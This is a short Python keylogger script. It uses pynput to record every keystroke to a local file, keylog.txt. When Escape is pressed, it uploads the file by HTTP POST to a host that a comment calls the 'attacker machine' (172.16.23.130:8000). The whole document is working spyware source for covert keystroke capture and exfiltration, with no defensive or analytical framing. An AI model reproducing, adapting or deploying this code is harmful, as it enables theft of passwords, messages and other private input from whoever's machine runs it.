import requests
from pynput.keyboard import Key, Listener

# sends key log to attacker machine
def send_log():
    url = "http://172.16.23.130:8000"
    files = {'file': open("keylog.txt", 'rb')}
    try:
        requests.post(url, files=files)
    except Exception as e:
        print("Failed to send log:", e)

# captures keystrokes
def on_press(key):

    print("\n{0} pressed.".format(key))
    write_file(key)

# writes keystrokes to file
def write_file(key):
    with open("keylog.txt", 'a') as file:
        k = str(key).replace("'","")
        if k.find("space") > 0:
            file.write(" ")
        elif k.find("Key") == -1:
            file.write(k)

# ends capture
def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    open('keylog.txt', 'w').close()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    send_log()